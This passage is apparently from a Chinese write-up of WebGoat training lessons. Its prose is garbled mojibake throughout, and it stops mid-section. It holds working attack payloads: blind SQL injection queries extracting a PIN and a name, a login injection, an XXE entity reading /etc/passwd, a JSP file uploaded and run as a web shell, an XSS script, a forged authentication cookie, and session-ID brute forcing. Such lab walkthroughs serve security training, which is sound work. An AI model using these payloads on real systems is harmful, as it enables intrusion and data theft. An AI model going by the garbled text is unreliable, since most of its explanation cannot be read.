<p>ÁõÆÊ†áÊòØÊâæÂà∞ cc_number ‰∏∫ 1111222233334444 ÁöÑË°åË°®Ê†ºÂºïËÑö‰∏≠Â≠óÊÆµÂºïËÑöÁöÑÂÄº„ÄÇËØ•Â≠óÊÆµÁöÑÁ±ªÂûã‰∏∫ intÔºåÂÆÉÊòØ‰∏Ä‰∏™Êï¥Êï∞„ÄÇ</p>
<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs abnf">Âà§Êñ≠ÈïøÂ∫¶<br><span class="hljs-number">10</span><span class="hljs-comment">;select pin from pins where cc_number =1111222233334444 and length(pin)=4-- +#</span><br><br>Ê≥ï‰∏ÄÔºö‰∫åÂàÜÊ≥ïÔºö<br><span class="hljs-number">10</span><span class="hljs-comment">;select pin from pins where cc_number =1111222233334444 and pin&lt;5000</span><br><br><span class="hljs-number">10</span><span class="hljs-comment">;select pin from pins where cc_number =1111222233334444 and pin&lt;2500</span><br><br><span class="hljs-number">10</span><span class="hljs-comment">;select pin from pins where cc_number =1111222233334444 and pin&lt;1250</span><br><br><span class="hljs-number">10</span><span class="hljs-comment">;select pin from pins where cc_number =1111222233334444 and pin&lt;1875</span><br><br><span class="hljs-number">10</span><span class="hljs-comment">;select pin from pins where cc_number =1111222233334444 and pin&lt;1875</span><br><br><span class="hljs-number">10</span><span class="hljs-comment">;select pin from pins where cc_number =1111222233334444 and pin&lt;2187.5</span><br><br><span class="hljs-number">10</span><span class="hljs-comment">;select pin from pins where cc_number =1111222233334444 and pin&lt;2343.75</span><br><br><span class="hljs-number">10</span><span class="hljs-comment">;select pin from pins where cc_number =1111222233334444 and pin&lt;2421.375</span><br><br><span class="hljs-number">10</span><span class="hljs-comment">;select pin from pins where cc_number =1111222233334444 and pin&lt;2382.5625</span><br><br><span class="hljs-number">10</span><span class="hljs-comment">;select pin from pins where cc_number =1111222233334444 and pin&lt;2363.15625</span><br><br><span class="hljs-number">10</span><span class="hljs-comment">;select pin from pins where cc_number =1111222233334444 and pin&lt;2372.859375</span><br><br><span class="hljs-number">10</span><span class="hljs-comment">;select pin from pins where cc_number =1111222233334444 and pin&lt;2368.0078125</span><br><br><span class="hljs-number">10</span><span class="hljs-comment">;select pin from pins where cc_number =1111222233334444 and pin&lt;2365.58203125</span><br><br><span class="hljs-number">10</span><span class="hljs-comment">;select pin from pins where cc_number =1111222233334444 and pin&lt;2364.369140625</span><br><br><span class="hljs-number">10</span><span class="hljs-comment">;select pin from pins where cc_number =1111222233334444 and pin=2364</span><br><br>Ê≥ï‰∫åÔºö<br><span class="hljs-number">10</span><span class="hljs-comment">;select pin from pins where cc_number =1111222233334444 and substr(pin,1,1)=2-- +#</span><br><br><span class="hljs-number">10</span><span class="hljs-comment">;select pin from pins where cc_number =1111222233334444 and substr(pin,1,2)=23-- +#</span><br><br><span class="hljs-number">10</span><span class="hljs-comment">;select pin from pins where cc_number =1111222233334444 and substr(pin,1,3)=236-- +#</span><br><br><span class="hljs-number">10</span><span class="hljs-comment">;select pin from pins where cc_number =1111222233334444 and substr(pin,1,4)=2364-- +#</span><br></code></pre></td></tr></table></figure>
<p><code>223364</code></p>
<h3 id="blind-string-sql-injection">Blind String SQL Injection</h3>
<p>‰∏ãÈù¢ÁöÑË°®Ê†ºÂÖÅËÆ∏Áî®Êà∑ËæìÂÖ•‰∏Ä‰∏™Â∏êÂè∑Âπ∂Á°ÆÂÆöÂÆÉÊòØÂê¶ÊúâÊïà„ÄÇ ‰ΩøÁî®Ê≠§Ë°®ÂçïÂºÄÂèëÁúü/ÂÅáÊµãËØïÊ£ÄÊü•Êï∞ÊçÆÂ∫ì‰∏≠ÁöÑÂÖ∂‰ªñÊù°ÁõÆ„ÄÇ</p>
<p>ÂèÇËÄÉ Ascii ÂÄºÔºö'A'= 65'Z'= 90'a'= 97'z'= 122</p>
<p>ÁõÆÊ†áÊòØÂú® cc_number ‰∏∫ 4321432143214321 ÁöÑË°åÁöÑË°®ÂºïËÑö‰∏≠ÊâæÂà∞Â≠óÊÆµÂêçÁß∞ÁöÑÂÄº„ÄÇËØ•Â≠óÊÆµÁöÑÁ±ªÂûãÊòØ varcharÔºåÂÆÉÊòØ‰∏Ä‰∏™Â≠óÁ¨¶‰∏≤„ÄÇ</p>
<p>Â∞ÜÂèëÁé∞ÁöÑÂêçÁß∞ÊîæÂú®Ë°®Âçï‰∏≠‰ª•‰º†ÈÄíËØæÁ®ã„ÄÇ Âè™ÊúâÂèëÁé∞ÁöÑÂêçÂ≠óÂ∫îËØ•ÊîæÂú®Ë°®ÂçïÂüü‰∏≠ÔºåÂØÜÂàáÂÖ≥Ê≥®ÊãºÂÜôÂíåÂ§ßÂ∞èÂÜô„ÄÇ</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">10</span>;<span class="hljs-keyword">select</span> <span class="hljs-type">name</span> <span class="hljs-keyword">from</span> pins <span class="hljs-keyword">where</span> cc_number=<span class="hljs-number">4321432143214321</span> <span class="hljs-keyword">and</span> length(<span class="hljs-type">name</span>)=<span class="hljs-number">4</span><span class="hljs-comment">-- +#</span><br><br><span class="hljs-number">10</span>;<span class="hljs-keyword">select</span> <span class="hljs-type">name</span> <span class="hljs-keyword">from</span> pins <span class="hljs-keyword">where</span> cc_number=<span class="hljs-number">4321432143214321</span> <span class="hljs-keyword">and</span> substr(<span class="hljs-type">name</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)=<span class="hljs-string">&#x27;J&#x27;</span><span class="hljs-comment">-- +#</span><br><br><span class="hljs-number">10</span>;<span class="hljs-keyword">select</span> <span class="hljs-type">name</span> <span class="hljs-keyword">from</span> pins <span class="hljs-keyword">where</span> cc_number=<span class="hljs-number">4321432143214321</span> <span class="hljs-keyword">and</span> substr(<span class="hljs-type">name</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>)=<span class="hljs-string">&#x27;Ji&#x27;</span><span class="hljs-comment">-- +#</span><br><br><span class="hljs-number">10</span>;<span class="hljs-keyword">select</span> <span class="hljs-type">name</span> <span class="hljs-keyword">from</span> pins <span class="hljs-keyword">where</span> cc_number=<span class="hljs-number">4321432143214321</span> <span class="hljs-keyword">and</span> substr(<span class="hljs-type">name</span>,<span class="hljs-number">1</span>,<span class="hljs-number">3</span>)=<span class="hljs-string">&#x27;Ji&#x27;</span><span class="hljs-comment">-- +#</span><br><br><span class="hljs-number">10</span>;<span class="hljs-keyword">select</span> <span class="hljs-type">name</span> <span class="hljs-keyword">from</span> pins <span class="hljs-keyword">where</span> cc_number=<span class="hljs-number">4321432143214321</span> <span class="hljs-keyword">and</span> substr(<span class="hljs-type">name</span>,<span class="hljs-number">1</span>,<span class="hljs-number">3</span>)=<span class="hljs-string">&#x27;Jil&#x27;</span><span class="hljs-comment">-- +#</span><br><br><span class="hljs-number">10</span>;<span class="hljs-keyword">select</span> <span class="hljs-type">name</span> <span class="hljs-keyword">from</span> pins <span class="hljs-keyword">where</span> cc_number=<span class="hljs-number">4321432143214321</span> <span class="hljs-keyword">and</span> substr(<span class="hljs-type">name</span>,<span class="hljs-number">1</span>,<span class="hljs-number">4</span>)=<span class="hljs-string">&#x27;Jill&#x27;</span><span class="hljs-comment">-- +#</span><br></code></pre></td></tr></table></figure>
<p><code>Jill</code></p>
<h2 id="denial-of-service">Denial of Service</h2>
<h3 id="zipbomb">ZipBomb</h3>
<p>ÊúçÂä°Âô®Âè™Êé•Âèó ZIP Êñá‰ª∂ÔºåÂú®‰∏ä‰º†ÂêéÊèêÂèñÂÆÉ‰ª¨ÔºåÂØπÂÆÉ‰ª¨ËøõË°åÂ§ÑÁêÜÂπ∂Âà†Èô§ÂÆÉÔºåÂÆÉÊèê‰æõ 20 MB ÁöÑ‰∏¥Êó∂Â≠òÂÇ®Êù•Â§ÑÁêÜÊâÄÊúâËØ∑Ê±ÇÂ∞ùËØïÊâßË°å DOS ÊîªÂáªÔºåÊ∂àËÄóÊâÄÊúâ‰∏¥Êó∂Â≠òÂÇ®‰∏é‰∏Ä‰∏™ËØ∑Ê±Ç</p>
<p><strong>Zip ÁÇ∏ÂºπÊòØ‰ªÄ‰πà‰∏úË•øÔºü</strong></p>
<p>Zip ÁÇ∏Âºπ‰πüË¢´Áß∞‰ΩúÊòØÊ≠ª‰∫°ÂéãÁº©ÂåÖÊàñËß£ÂéãÁº©ÁÇ∏ÂºπÔºåËøôÊòØ‰∏ÄÁßçÊÅ∂ÊÑèÊñáÊ°£ÔºàarchiveÔºâÊñá‰ª∂ÔºåÂΩìÊüê‰∏™Á®ãÂ∫èÊàñÁ≥ªÁªüÂ∞ùËØïËØªÂèñËøô‰∏™Êñá‰ª∂Êó∂ÔºåÂÆÉ‰æø‰ºöËÆ©ÁõÆÊ†áÂèëÁîüÂ¥©Ê∫É„ÄÇ‰∏ÄËà¨Êù•ËØ¥ÔºåÊîªÂáªËÄÖ‰ºöÂà©Áî®ËøôÁßç Zip ÁÇ∏ÂºπÊù•ËÆ©ÂèçÁóÖÊØíËΩØ‰ª∂Â¥©Ê∫ÉÔºåÁÑ∂Âêé‰∏∫‰º†ÁªüÁóÖÊØíÁöÑÊÑüÊüìÊâ´Ê∏ÖÈöúÁ¢ç„ÄÇ</p>
<p>‰∏ªË¶ÅÊòØÂéãÁº©ÊØîË¶ÅÈ´ò‰∏ÄÁÇπÔºåÂèØ‰ª•Êñ∞Âª∫‰∏Ä‰∏™ txtÔºåÂÖ®ÂÜô 0ÔºåÁÑ∂ÂêéÂ§öÂ§çÂà∂Âá†‰∏™ txtÔºåÂéãÁº©Ëµ∑Êù•„ÄÇ40m ÁöÑ txt ÂéãÁº©ÂêéÂ§ßÁ∫¶ÊòØ 70kb„ÄÇ‰∏ä‰º†Âç≥ÂèØ„ÄÇÊú¨Êù•ÊâìÁÆóÁî® zip ÁÇ∏ÂºπÁöÑÔºå‰ΩÜÊòØÂêéÂè∞Â§ÑÁêÜÁöÑÊó∂ÂÄôÂèØËÉΩÁúãËß£ÂéãÂá∫ÈîôÂ∞±Êâî‰∫ÜÔºåÊâÄ‰ª•‰∏ä‰º†Âêé‰ªÄ‰πàËøîÂõûÈÉΩÊ≤°Êúâ</p>
<h3 id="denial-of-service-from-multiple-logins">Denial of Service from Multiple Logins</h3>
<p>ÊãíÁªùÊúçÂä°ÊîªÂáªÊòØ Web Â∫îÁî®Á®ãÂ∫è‰∏≠ÁöÑ‰∏Ä‰∏™‰∏ªË¶ÅÈóÆÈ¢ò„ÄÇ Â¶ÇÊûúÊúÄÁªàÁî®Êà∑Êó†Ê≥ïÂºÄÂ±ï‰∏öÂä°ÊàñÊâßË°å Web Â∫îÁî®Á®ãÂ∫èÊèê‰æõÁöÑÊúçÂä°ÔºåÈÇ£‰πàÊµ™Ë¥πÊó∂Èó¥ÂíåÈáëÈí±„ÄÇ</p>
<p>ÊÄªÁõÆÊ†áÔºö</p>
<p>ËØ•ÁΩëÁ´ôÂÖÅËÆ∏Áî®Êà∑Â§öÊ¨°ÁôªÂΩï„ÄÇ ËØ•Á´ôÁÇπÊúâ‰∏Ä‰∏™ÂÖÅËÆ∏ 2 ‰∏™ËøûÊé•ÁöÑÊï∞ÊçÆÂ∫ìËøûÊé•Ê±†„ÄÇ ÊÇ®ÂøÖÈ°ªËé∑ÂèñÊúâÊïàÁî®Êà∑ÁöÑÂàóË°®ÔºåÂπ∂ÂàõÂª∫ÊÄªÂÖ± 3 Ê¨°ÁôªÂΩï„ÄÇ</p>
<p>È¶ñÂÖàÂØπ User Name ËøõË°åÊ≥®ÂÖ•Ôºö</p>
<p><code>1' or 1=1-- +#</code></p>
<p>ÁÑ∂Âêé‰ºöÂá∫Áé∞ÊâÄÊúâÁöÑÁî®Êà∑ÔºåÈÄâÂâç 3 ‰∏™ÁôªÈôÜÂç≥ÂèØ(ÂêéÈù¢ 2 ‰∏™ÂÆÉÊèêÁ§∫‰∏çËÉΩ‰ΩøÁî®)</p>
<p><code>1' or user_name=jsnow-- +#</code></p>
<h2 id="insecure-communication">Insecure Communication</h2>
<h3 id="insecure-login">Insecure Login</h3>
<h4 id="stage-1-7">Stage 1</h4>
<p>Èò∂ÊÆµ 1ÔºöÂú®Ëøô‰∏™Èò∂ÊÆµ‰Ω†ÂøÖÈ°ªÂóÖÊé¢ÂØÜÁ†Å„ÄÇ ÁôªÂΩïÂêéÂõûÁ≠îÈóÆÈ¢ò„ÄÇ</p>
<p>ÊäìÂåÖÔºå<code>clear_pass=sniffy</code></p>
<h4 id="stage-2-7">Stage 2</h4>
<p>Stage2ÔºöÁé∞Âú®ÊÇ®ÂøÖÈ°ªÂàáÊç¢Âà∞ÂÆâÂÖ®ËøûÊé•„ÄÇ ËØ• URL Â∫î‰ª• httpsÔºö//ÂºÄÂ§¥„ÄÇÂ¶ÇÊûúÊÇ®ÁöÑÊµèËßàÂô®ÂØπËØ•ËØÅ‰π¶Êä±ÊÄ®Âè™ÊòØÂøΩÁï•ÂÆÉ„ÄÇ ÂÜçÊ¨°ÂóÖÊé¢‰∫§ÈÄöÂπ∂ÂõûÁ≠îÈóÆÈ¢ò</p>
<p>ÂàáÊç¢Âà∞ HTTPS ‰πãÂêéÊâì‰∏çÂºÄÁΩëÈ°µÔºåÂèØËÉΩÊòØ WebGoat Ê≤°ÊúâÊèê‰æõ HTTPS ÁöÑÊúçÂä°Âêß</p>
<p>ÊÄª‰πãÈÄâ NoÔºåTLS</p>
<h2 id="insecure-storage">Insecure Storage</h2>
<h3 id="encoding-basics">Encoding Basics</h3>
<p>Êú¨ËØæÂ∞Ü‰ΩøÁî®Êà∑ÁÜüÊÇâ‰∏çÂêåÁöÑÁºñÁ†ÅÊñπÊ°à„ÄÇ</p>
<p>ËæìÂÖ•Â≠óÁ¨¶‰∏≤‚Äúabc‚Äù„ÄÇ Âú®‰∏ãÈù¢ÁöÑÂàóË°®‰∏≠ÔºåÊÇ®ÂèØ‰ª•ÁúãÂà∞Â≠óÁ¨¶‰∏≤ÁöÑÁºñÁ†ÅÂÄº„ÄÇ ÂØπ‰∫é rot13 ÁºñÁ†ÅÔºåËøôÊòØ‚Äúnop‚Äù„ÄÇ Áé∞Âú®ËæìÂÖ•‰∏Ä‰∏™Â≠óÁ¨¶‰∏≤‚Äúa c‚ÄùÂπ∂Êü•Áúã url ÁºñÁ†Å„ÄÇ</p>
<p>ÁÖßÂÅöÂç≥ÂèØ</p>
<h2 id="malicious-execution">Malicious Execution</h2>
<p>ÊÅ∂ÊÑèÊâßË°å</p>
<h3 id="malicious-file-execution">Malicious File Execution</h3>
<p>‰∏ãÈù¢ÁöÑË°®Ê†ºÂÖÅËÆ∏ÊÇ®‰∏ä‰º†Â∞ÜÊòæÁ§∫Âú®Ê≠§È°µÈù¢‰∏äÁöÑÂõæÂÉè„ÄÇ ÂÉèËøôÊ†∑ÁöÑÂäüËÉΩÈÄöÂ∏∏Âú®Âü∫‰∫é Web ÁöÑËÆ®ËÆ∫ÊùøÂíåÁ§æ‰∫§ÁΩëÁ´ô‰∏äÊâæÂà∞„ÄÇ Ê≠§ÂäüËÉΩÊòìÂèóÊÅ∂ÊÑèÊñá‰ª∂ nt ÊâßË°åÁöÑÂΩ±Âìç„ÄÇ</p>
<p>‰∏∫‰∫ÜÈÄöËøáÊú¨ËØæÔºå‰∏ä‰º†Âπ∂ËøêË°åÊÅ∂ÊÑèÊñá‰ª∂„ÄÇ ‰∏∫‰∫ÜËØÅÊòé‰Ω†ÁöÑÊñá‰ª∂ÂèØ‰ª•ÊâßË°åÔºåÂÆÉÂ∫îËØ•ÂàõÂª∫Âè¶‰∏Ä‰∏™Âêç‰∏∫Ôºö</p>
<p>/home/macr0phag3/Downloads/.extract/webapps/WebGoat/mfe_target/guest.txt</p>
<p>‰∏ÄÊó¶‰Ω†ÂàõÂª∫‰∫ÜËøô‰∏™Êñá‰ª∂Ôºå‰Ω†Â∞ÜÈÄöËøáËøô‰∏™ËØæÁ®ã„ÄÇ</p>
<p>ÂÖà‰º†‰∏Ä‰∏™Ê≠£Â∏∏ÂõæÁâáÔºåÁúãÁúãË∑ØÂæÑ„ÄÇÁÑ∂ÂêéÂÜç‰º†‰∏Ä‰∏™ jspÔºàshell.jspÔºâ</p>
<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gradle">&lt;HTML&gt;<br><br>&lt;% java.io.<span class="hljs-keyword">File</span> <span class="hljs-keyword">file</span>= <span class="hljs-keyword">new</span> java.io.<span class="hljs-keyword">File</span>(<span class="hljs-string">&quot;/home/macr0phag3/Downloads/.extract/webapps/WebGoat/mfe_target/guest.txt&quot;</span>);<span class="hljs-keyword">file</span>.createNewFile();%&gt;<br><br>&lt;/HTML&gt;<br></code></pre></td></tr></table></figure>
<p>ËÆøÈóÆ shell.jsp Â∞±ÈÄöËøá‰∫Ü</p>
<h2 id="parameter-tampering">Parameter Tampering</h2>
<h3 id="bypass-html-field-restrictions">Bypass HTML Field Restrictions</h3>
<p>ÁªïËøá HTML Â≠óÊÆµÈôêÂà∂</p>
<p>‰∏ãÈù¢ÁöÑË°®Âçï‰ΩøÁî® HTML Ë°®ÂçïÂ≠óÊÆµÈôêÂà∂„ÄÇ ‰∏∫‰∫ÜÈÄöËøáÊú¨ËØæÔºåËØ∑Êèê‰∫§ÂåÖÂê´‰∏çÂÖÅËÆ∏ÂÄºÁöÑÊØè‰∏™Â≠óÊÆµÁöÑË°®Âçï„ÄÇ ÊÇ®ÂøÖÈ°ªÂú®‰∏Ä‰∏™Ë°®ÂçïÊèê‰∫§‰∏≠‰∏∫ÊâÄÊúâÂÖ≠‰∏™Â≠óÊÆµÊèê‰∫§Êó†ÊïàÂÄº„ÄÇ</p>
<p>ÂÖàÁî® F12 Êää disables Êîπ‰∫ÜÔºåÁÑ∂ÂêéÂú®ÊäìÂåÖÔºåÊääÊØè‰∏™ÂèÇÊï∞ÈÉΩÈöè‰æøÊîπÊîπÔºåÊèê‰∫§Âç≥ÂèØ</p>
<h3 id="xml-external-entity-xxe">XML External Entity (XXE)</h3>
<p><em>ÊÇ®Ê≠£Âú®ÂØªÊâæÊù•Ëá™È©¨Ëê®ËØ∏Â°ûÂ∑ûÊ≥¢Â£´È°øÁöÑÊú∫Á•®‰ª£Á†Å BOSÔºå‰ª•Ëé∑ÂæóÁêÜÊÉ≥ÁöÑÂÅáÊúü„ÄÇ Â∞ùËØïÊêúÁ¥¢‰∏ÄÂº†Á•®„ÄÇ<br />
</em>Â∞ùËØïÂú®ÊêúÁ¥¢Ë°®Âçï‰∏≠ÊâæÂà∞Áº∫Èô∑Âπ∂ÂàóÂá∫Êìç‰ΩúÁ≥ªÁªüÁöÑÊ†πÁõÆÂΩï„ÄÇ</p>
<p>ÊäìÂåÖÔºåÂ∞Ü xml Êîπ‰∏∫</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span><br>	 <span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">foo</span> [</span><br><span class="hljs-meta">	 <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">myentity</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///etc/passwd-&quot;</span> &gt;</span>]&gt;</span><br>	<span class="hljs-tag">&lt;<span class="hljs-name">searchForm</span>&gt;</span><br>		<span class="hljs-tag">&lt;<span class="hljs-name">from</span>&gt;</span><span class="hljs-symbol">&amp;myentity;</span><span class="hljs-tag">&lt;/<span class="hljs-name">from</span>&gt;</span><br>	<span class="hljs-tag">&lt;/<span class="hljs-name">searchForm</span>&gt;</span><br></code></pre></td></tr></table></figure>
<h3 id="exploit-hidden-fields">Exploit Hidden Fields</h3>
<p>Â∞ùËØïË¥≠‰π∞‰Ωé‰∫éË¥≠‰π∞‰ª∑Ê†ºÁöÑ HDTVÔºåÂ¶ÇÊûúÊÇ®ËøòÊ≤°ÊúâË¥≠‰π∞„ÄÇ</p>
<p>ÊäìÂåÖÊîπ Price Âç≥ÂèØ</p>
<h3 id="exploit-unchecked-email">Exploit Unchecked Email</h3>
<p>Ê≠§Ë°®ÂçïÊòØÂÆ¢Êà∑ÊîØÊåÅÈ°µÈù¢ÁöÑÁ§∫‰æã„ÄÇ ‰ΩøÁî®‰∏ãÈù¢ÁöÑË°®ÂçïÂ∞ùËØïÔºö<br />
1ÔºâÂèëÈÄÅÊÅ∂ÊÑèËÑöÊú¨Âà∞ÁΩëÁ´ôÁÆ°ÁêÜÂëò„ÄÇ<br />
2Ôºâ‰ªé OWASP ÂêëÊÅ∂ÊÑèËÑöÊú¨ÂèëÈÄÅ‰∏Ä‰∏™ÊÅ∂ÊÑèËÑöÊú¨„ÄÇ</p>
<p>ÂÖàÊèíÂÖ• <code>&lt;script&gt;alert('xss')&lt;/script&gt;</code> ÂèëÈÄÅÔºåÁÑ∂ÂêéÂú®ÊäìÂåÖÈöè‰æøÊîπÊîπ email</p>
<h3 id="bypass-client-side-javascript-validation">Bypass Client Side JavaScript Validation</h3>
<p>Êú¨ÁΩëÁ´ôÊâßË°åÂÆ¢Êà∑Á´ØÂíåÊúçÂä°Âô®Á´ØÈ™åËØÅ„ÄÇ ÂØπ‰∫éËøô‰∏™ÁªÉ‰π†Ôºå‰Ω†ÁöÑÂ∑•‰ΩúÊòØÊâìÁ†¥ÂÆ¢Êà∑Á´ØÈ™åËØÅÂπ∂ÂèëÈÄÅÂÆÉ‰∏çÊúüÊúõÁöÑÁΩëÁ´ôËæìÂÖ•„ÄÇ ‰Ω†ÂøÖÈ°ªÂêåÊó∂ÊâìÁ†¥ÊâÄÊúâ 7 ‰∏™È™åËØÅÂô®„ÄÇ</p>
<p>ÊäìÂåÖÔºåÊääÊØè‰∏™ÂèÇÊï∞ÈÉΩÊîπ‰∏∫‰∏çÁ¨¶ÂêàÊ≠£ÂàôÁöÑÂ∞±Ë°åÔºåÊØîÂ¶ÇÊØè‰∏™ÂèÇÊï∞ÈÉΩÂä†‰∏Ä‰∏™ <code>!</code></p>
<h2 id="session-management-flaws">Session Management Flaws</h2>
<h3 id="spoof-an-authentication-cookie">Spoof an Authentication Cookie</h3>
<p>Áî®Êà∑Â∫îËØ•ËÉΩÂ§üÁªïËøáËÆ§ËØÅÊ£ÄÊü•„ÄÇ ‰ΩøÁî® webgoat / webgoat Â∏êÊà∑ÁôªÂΩï‰ª•Êü•Áúã‰ºöÂèëÁîü‰ªÄ‰πàÊÉÖÂÜµ„ÄÇ ‰Ω†‰πüÂèØ‰ª•Â∞ùËØï aspect/aspect„ÄÇ ÂΩìÊÇ®‰∫ÜËß£Ë∫´‰ªΩÈ™åËØÅ cookie Êó∂ÔºåËØ∑Â∞ùËØïÂ∞ÜÊÇ®ÁöÑË∫´‰ªΩÊõ¥Êîπ‰∏∫ alice„ÄÇ</p>
<p><code>65432ubphcfx webgoat</code></p>
<p><code>65432ubphcfx webgoat</code></p>
<p><code>65432udfqtb aspect</code></p>
<p><code>65432udfqtb aspect</code></p>
<p>Êï∞Â≠óÈÉ®ÂàÜË≤å‰ººÊ≤°ÂèòÔºåÂ≠óÊØçÈÉ®ÂàÜÁúã‰∏äÂéªÂÉèÂáØÊííÔºåÁàÜÁ†¥‰∫Ü‰∏Ä‰∏ãÔºö</p>
<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">vcqidgy<br>wdrjehz<br>xeskfia<br>yftlgjb<br>zgumhkc<br>ahvnild<br><span class="hljs-keyword">biwojme</span><br><span class="hljs-keyword"></span>cjxpknf<br>dkyqlog<br>elzrmph<br>fmasnqi<br>gnbtorj<br>hocupsk<br>ipdvqtl<br><span class="hljs-keyword">jqewrum</span><br><span class="hljs-keyword"></span>krfxsvn<br>lsgytwo<br>mthzuxp<br>nuiavyq<br>ovjbwzr<br>pwkcxas<br>qxldybt<br>rymezcu<br>sznfadv<br>taogbew<br></code></pre></td></tr></table></figure>
<p>ÊâæÊù•ÊâæÂéªÊ≤°ÁúãÂà∞ webÔºåÂêéÊù•ÂèëÁé∞ÊúÄÂêé‰∏ÄË°å„ÄÇ„ÄÇ„ÄÇ</p>
<p>ÈÇ£‰πàÂ¶ÇÊ≥ïÁÇÆÂà∂ <code>alice</code> Âç≥ÂèØÔºå‰∏∫ <code>fdjmb</code></p>
<h3 id="hijack-a-session">Hijack a Session</h3>
<p>ÂºÄÂèëËá™Â∑±‰ºöËØù ID ÁöÑÂ∫îÁî®Á®ãÂ∫èÂºÄÂèë‰∫∫ÂëòÁªèÂ∏∏ÂøòËÆ∞ÂåÖÂê´ÂÆâÂÖ®ÊÄßÊâÄÈúÄÁöÑÂ§çÊùÇÊÄßÂíåÈöèÊú∫ÊÄß„ÄÇ Â¶ÇÊûúÁî®Êà∑ÁâπÂÆöÁöÑ‰ºöËØù ID ‰∏çÊòØÂ§çÊùÇ‰∏îÈöèÊú∫ÁöÑÔºåÈÇ£‰πàÂ∫îÁî®Á®ãÂ∫èÂæàÂÆπÊòìÂèóÂà∞Âü∫‰∫é‰ºöËØùÁöÑÊö¥ÂäõÊîªÂáª„ÄÇ</p>
<p>Â∞ùËØïËÆøÈóÆÂ±û‰∫é‰ªñ‰∫∫ÁöÑÂ∑≤ËÆ§ËØÅ‰ºöËØù„ÄÇ</p>
<p>ÊµãËØï‰∫Ü‰∏Ä‰∏ãÔºåÁúã‰∏äÂéªÊØèÊ¨°ËÆøÈóÆ Cookie ÁöÑ <code>-</code> ‰πãÂâçÁöÑÂì¶Êï∞Â≠óÈÉΩÊòØ+1 ÈÄíÂ¢ûÁöÑ„ÄÇÂ¶ÇÊûúÂÆ¢Êà∑Á´ØÂèëÈÄÅÁªô Web ÊúçÂä°Âô®ÁöÑËØ∑Ê±ÇÈáåÈù¢Ê≤°Êúâ‰ºöËØùÊ†áËØÜÁöÑËØùÔºåÊúçÂä°Âô®‰ºö‰ªéÊñ∞ÁîüÊàê‰∏Ä‰∏™Êñ∞ÁöÑ‰ºöËØùÊ†áËØÜÂπ∂ÈÄöËøá Cookie ËøîÂõûÁªôÂÆ¢Êà∑Á´Ø„ÄÇÊó¢ÁÑ∂Â≠òÂú®‰ªñ‰∫∫ÁöÑËÆ§ËØÅ‰ºöËØùÔºåÈÇ£‰πàÂøÖÂÆöÊúâ‰∏Ä‰∏™ Cookie ÊòØË¢´Âç†Áî®ÁöÑÔºå‰πüÂ∞±ÊòØÂàÜÈÖçÁªôÊàë‰ª¨ÁöÑ Cookie Â≠òÂú®Ë∑≥Ë∑É„ÄÇ</p>
<p>Âà©Áî® bs ÁöÑ Intruder ÊµãËØï‰∏Ä‰∏ãÔºåÊää payload ÊîæÂú® password Âç≥ÂèØÔºåpayload Êîπ‰∏∫Êï∞Â≠óÂûãÔºåÂÖàÂèë 50 ‰∏™ÁúãÁúã„ÄÇÁªìÊûúÂèëÁé∞Âú® 25Ôºå26 ‰∏™ËØ∑Ê±Ç‰∏≠Âá∫Áé∞Êñ≠Â±ÇÔºö</p>
<p>25Ôºö</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs 2">HTTP/1.1 200 OK<br>Server: Apache-Coyote/1.1<br>Set-Cookie: WEAKID=12875-1523008242367<br>Content-Type: text/html;charset=ISO-8859-1<br>Content-Length: 1281<br>Date: Fri, 06 Apr 2018 09:50:42 GMT<br>Connection: close<br></code></pre></td></tr></table></figure>
<p>26</p>
